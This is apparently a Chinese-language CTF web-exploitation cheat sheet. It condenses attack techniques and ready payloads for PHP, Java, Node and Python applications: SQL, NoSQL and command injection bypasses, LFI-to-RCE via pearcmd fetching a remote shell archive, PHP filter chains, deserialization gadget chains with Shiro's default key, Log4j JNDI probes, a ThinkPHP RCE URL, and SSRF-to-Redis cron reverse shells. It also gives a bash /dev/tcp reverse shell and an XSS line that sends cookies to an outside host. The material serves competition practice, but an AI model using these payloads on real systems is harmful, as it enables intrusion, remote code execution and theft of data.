# Web 知识卡

> 2024-2026 考点补充：PHP filter chain RCE、Java 反序列化全家桶、原型链污染、NoSQL 注入。

## 常用工具
- curl, ffuf/gobuster/dirsearch, sqlmap, burpsuite, whatweb, nmap, hydra
- sqlmap 全参数手册：`~/.fulilian/ctf-knowledge/工具使用/sqlmap-Cheat-Sheet.pdf`（PDF，FTS 搜不到，按路径翻）
- php_filter_chain_generator, ysoserial, marshalsec, jwt_tool, gopherus, JNDIExploit

## 常见漏洞（PHP 系）
- SQL 注入：union / 报错 extractvalue,updatexml / 布尔、时间盲注 / 堆叠 handler,PREPARE；绕 WAF：/**/、%09、双写、内联注释
- 报错注入补充：BigInt 溢出 `and exp(~(select * from (select user())a))`；extractvalue 32 字符上限用 left()/substr 分段读
- 堆叠注入进阶：`RENAME TABLE`+`ALTER TABLE CHANGE` 换表名查无权限表；PREPARE 拼接绕关键字 `concat('s','elect')` 或 `set@a=0x..` hex 后 execute
- 盲注等价替换：sleep→benchmark(5000000,sha1('a'))/get_lock；等号→like/regexp/between；逗号→join、limit offset 语法；substring→mid/substr/left
- SQLite 注入：无 information_schema，改查 `union select 1,group_concat(sql),3 from sqlite_master`；ATTACH DATABASE 可写文件
- MongoDB 注入：`username[$ne]=1&password[$ne]=1` 绕登录；`$regex` 盲注；`$where` 执行 JS
- 文件包含：`php://filter/read=convert.base64-encode/resource=`；死亡 exit 用 base64-decode/string.strip_tags/iconv 绕
- LFI 后缀拼接绕过：00 截断(PHP<5.3.4)、././. 长度截断(Linux 4096)、`zip://shell.zip#shell` 不受后缀限制；LFI+pearcmd.php（Docker 常见）：`?file=/usr/local/lib/php/pearcmd.php&+install+-R+/tmp+http://vps/shell.tar`
- LFI 落点：日志 /var/log/nginx|apache2/access.log（UA 写马）、/tmp/sess_XXXX（session 上传进度或注册用户名写马）
- PHP filter chain RCE：include 参数完全可控（含后缀拼接）时，多层 convert.iconv 合成任意 PHP 代码（php_filter_chain_generator 一键生成）
- 文件上传：.phtml/.php5/.pht/大小写/::$DATA 绕黑名单；.htaccess（AddType/SetHandler）与 .user.ini(auto_prepend_file)；图片马
- 上传细节：Nginx 解析漏洞 `1.png/x.php`（cgi.fix_pathinfo）；Windows 保存截断 `x.php/.`（尾部 /. 被丢弃）；图片马 `copy /b a.jpg+shell.php`、GIF89a 头、`exiftool -Comment='<?php ...>' x.jpg`
- phar 反序列化：file_exists/is_file/file_get_contents 等文件函数 + phar:// 即触发 metadata unserialize；生成：new Phar→addFromString→setStub('<?php __HALT_COMPILER(); ?>')→setMetadata(恶意对象)
- POP 链构造：按魔术方法逐级跳——__destruct/__wakeup 入口，__toString(字符串拼接)、__call/__get(访问不存在成员)、__invoke(对象当函数)，找到达 sink（system/eval/file_put_contents）的最短路径
- 手工构造 PHP 序列化（无 PHP 环境）：protected 属性键 `\0*\0prop`、private 键 `\0Class\0prop`，字节长错一位全链失效，urlencode 自动转 %00；clone→__clone、isset→__isset 也是链跳点
- 变量覆盖：`extract($_GET)`/parse_str 覆盖变量接 eval、include 等 sink（动态 flag 藏匿点见常见思路第 5 条）
- 数组拼代码写 shell（实测）：值内插单引号时 `cmd=a','b'=>system('ls /'),'c` 三段式闭合注入；file_put_contents 只写不执行，从响应 var_dump 提取 md5 随机文件名后单独 GET 触发（每请求文件名不同）
- 分段 flag/密码套路（实测）：robots.txt PART ONE + www.zip/backup.zip 弱名备份包 PART TWO 按序拼接不自行补 }；分段密码先反推总长（substr 算术）再拼；解压忽略 __MACOSX/._*；.swp 用 strings -a 看源码；谐音变体文件名藏关键功能
- Flask debug 源码泄露（实测）：少传参触发 TypeError、传非数字触发 ValueError，Werkzeug Debugger traceback 直接渲染 app.py 含 flag 常量；title 特征 // Werkzeug Debugger，响应含 EVALEX/PIN 情报
- SQLi 读文件：union/select 被过滤时 load_file 不受限——`or (ascii(substr(load_file('/app/public/sql.php'),N,1))>X)` 盲注读源码；/flag 读不到就读 /start.sh，其 sed+mv 逻辑暴露 flag 位置；位掩码 8 请求并发提速 8-10 倍
- OPcache 投毒：opcache.file_cache 开启时字节码在 /tmp/OPcache/[system_id]/[webroot]/x.php.bin，本地同版本 PHP 生成缓存、替换文件内 system_id 字段（8 字节 magic 后 40 字节，与本地 `php -i` 对照）+ 校验时间戳，SQLi `INTO DUMPFILE` 覆写绕上传限制执行 PHP
- SSTI：`{{7*7}}`/`${7*7}`/`<%=7*7%>`/`#{7*7}` 判引擎；Jinja2 用 catch_warnings 遍历 __subclasses__ 通用 RCE
- SSTI 全黑名单绕过（实测）：禁引号/下划线/点/方括号时 `|attr()` 替代点号、`dict(x=1)|join~...` 拼任意词、`(lipsum|string)|batch(19)|first|last` 取 `_`、`config|attr('get')('APPLICATION_ROOT')` 得 `/`（字符串均由 dict|join~ 拼出，非字面引号）
- eval/命令执行探测顺序：先 `phpinfo();`（常不在黑名单，环境变量可能直接露 flag）再上 RCE；str_ireplace 单轮替换黑名单用 `strrev(METSYS)(pack(CCCC,108,115,32,47))` 反转函数名+pack 拼命令双绕（glob(/*) 的 /* 被当 PHP 注释，列目录用 ls /）
- 命令注入：`${IFS}` 绕空格、tac/nl/more 绕 cat、变量拼接/通配符绕关键字；无回显用 DNSlog/curl 外带
- 命令注入补充：`echo Y2F0...|base64 -d|bash`、`echo hex|xxd -r -p|bash` 绕全过滤；`fl\ag`、`fl''ag`、`f?ag` 三板斧；无字母数字 webshell 用取反 `$_=~(%8F%97%8F%96%91%99%90)` 或异或构造 assert/_POST
- 无回显判真：`if [ $(cat /flag|cut -c1) = 'f' ]; then sleep 3; fi` 时间盲；反弹 shell 首选 `bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"` 的 base64 版防转义丢字符
- XXE：`file:///flag` 读文件，无回显用 ftp/http OOB 外带；libxml2≥2.9 默认禁外部 DTD/网络加载，仍可试 file:// 本地读与 OOB
- PHP 弱类型/比较绕过（国内最高频）：`md5($a)==md5($b)` 用 0e 开头串（0e215962017）或数组 `a[]=1`；`===` 用真实 md5 碰撞（fastcoll）；`strcmp(数组)` 返回 NULL 绕；`intval` 科学计数法/`intval('1e3')==1000`；`preg_match('/^...$/')` 用 `%0a` 绕 `$`；`is_numeric` 弱比较十六进制（仅 PHP5，PHP7+ 对 '0x1A' 返回 false）
- XSS/WS：至少会 `<img src=x onerror=location='//vps/'+document.cookie>` 外带变体；WebSocket 流量浏览器 F12 → Network → WS 面板逐帧看
- 原生类扩展：SoapClient 做 SSRF、LFI+日志/Session 包含转 RCE、__wakeup 属性数绕过

## 常见漏洞（Java 系必背）
- Shiro550：rememberMe = base64(AES-CBC(反序列化 payload))；默认密钥 `kPH+bIxk5D2deZiIxcaaaA==`，超长 base64 cookie 即可疑
- Shiro721：Padding Oracle 构造任意反序列化，需一个有效 rememberMe 样本
- CC 链速记：CC1=AnnotationInvocationHandler+LazyMap(JDK≤8u65)；CC2=PriorityQueue+TemplatesImpl(cc4)；CC3=TrAXFilter 字节码；CC5=BadAttributeValueExpException；CC6=HashSet+TiedMapEntry（最通用不限 JDK）；CC11=通用
- CC 链区分要点：先认入口（Annotation/PriorityQueue/BadAttr/HashSet），再认 sink——InvokerTransformer 反射执行 vs TemplatesImpl.defineClass 字节码（后者可绕 Runtime 被 ban）
- CB 链：commons-beanutils BeanComparator+TemplatesImpl；Shiro 环境只带 CB 不带 CC 时首选，注意默认比较器来自 CC 需换 JDK 自带 Comparator
- 高版本 JNDI 绕过：8u121+/8u191+ 禁 remote codebase → 本地 BeanFactory+forceString(ELProcessor)、LDAP 返回序列化数据打本地 gadget、或退回 classpath 依赖利用
- Log4j2：`${jndi:ldap://dnslog/}` 探测，header/UA/表单/JSON 全参数打一遍，`${${lower:j}ndi}` 嵌套绕过
- 反序列化无回显：URLDNS 探测链路、sleep 时间盲、CommonsIO/UTF-8 Overlong OOB

## 常见漏洞（Node/Python/框架）
- Node 原型链污染：`__proto__`/`constructor.prototype` 打 merge/deepCopy/lodash.set；RCE gadget：污染 child_process 的 shell+NODE_OPTIONS，或 EJS 模板选项
- Python pickle：可控点调用 pickle.loads 即打 `__reduce__`；yaml.load 未用 SafeLoader 用 `!!python/object/apply`；Flask session 弱密钥伪造
- JWT：alg=none、弱密钥爆破(hashcat -m 16500)、RS256→HS256 公钥混淆、kid 目录穿越/SQL 注入
- Laravel：APP_KEY 泄露 → CVE-2018-15133 X-XSRF-TOKEN 反序列化；POP 链 PendingBroadcast→Dispatcher→command
- ThinkPHP：TP5 `?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`；TP5/6 反序列化链；多语言切换 LFI
- SSRF：gopher://（Redis/FastCGI/MySQL 一把梭）、file://、dict://；IP 绕过 0x7f.0.0.1/十进制/解析差异；打云 IMDS 169.254.169.254
- SSRF 打 Redis 逐步版（gopher 受限用 dict 兜底）：`dict://127.0.0.1:6379/config:set:dir:/var/spool/cron` → `config:set:dbfilename:root` → `set:1:%0A%0A*/1%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/IP/PORT%200>&1%0A%0A`（空格务必 %20 或用 ${IFS}）→ `save`
- SSRF 打 FastCGI 条件：gopher 放行（取决于客户端构建与协议白名单，无固定版本门槛）+ PHP-FPM 9000 可达 + 知道绝对路径，PHP_VALUE allow_url_include=On + PHP_ADMIN_VALUE=auto_prepend_file=php://input 执行任意代码；302 跳转页可绕白名单
- GraphQL：/graphql 内省 `{__schema{types{name}}}`；内省禁用则按字段名猜、batch query 绕限流
- HTTP 走私：CL-TE / TE-CL 差异绕前端鉴权/污染缓存

## 模板/资产路由
- 遇到 LFI/死亡 exit/include 可控 → templates/web_php_filter_chain.py（改 HOST/PORT 即用）
- 遇到疑似模板注入 → templates/web_ssti_probe.py（改 HOST/PORT 即用）
- 遇到 JWT 鉴权伪造 → templates/web_jwt_kit.py（改 HOST/PORT 即用）
- 遇到 SSRF 打内网 Redis/FastCGI → templates/web_ssrf_gopher.py（改 HOST/PORT 即用）
- 遇到确认注入点需拖库 → templates/web_sqlmap_kit.py（改 HOST/PORT 即用）
- 遇到上传点+文件操作函数（phar）→ templates/web_phar_gen.py（改 HOST/PORT 即用）
- 遇到无回显 RCE/盲注 → templates/web_oob_rce.py（改 HOST/PORT 即用）
- 遇到 Python pickle/Flask session → templates/web_pickle_pt.py（改 HOST/PORT 即用）

## 常见思路
1. 开场 3 分钟：robots.txt/.git/.env/备份文件/swagger/api docs → 拿到源码优先审计
2. 有源码：grep unserialize|include|eval|system|exec → 顺着用户输入跟到 sink
3. 无源码：whatweb 指纹 → 查已知 CVE；登录框先 SQL 注入/弱口令 admin:admin
4. 打点前先留痕：DNSlog/URLDNS 确认出网，再决定 OOB 还是回显路线
5. 拿到 RCE 找 flag：`ls /`、`env`、`find / -iname "*flag*"`；容器环境优先查环境变量——动态 flag 常混进 `TZ` 这类非常规变量，`printenv` 全量查，flag.sh 的 not_here 是干扰
6. 权限不够：SUID/sudo -l/crontab/内核提权；再考虑横向打内网
7. 别只盯注入：二次注入、越权 IDOR 遍历、逻辑漏洞（价格/数量负数）常是出题点

## 常见 Flag 格式
- `flag{...}`, `CTF{...}`, `HTB{...}`, `NSSCTF{...}`, `CTF2{...}`（DASCTF http-ctf2 系列平台动态 flag 实测格式）
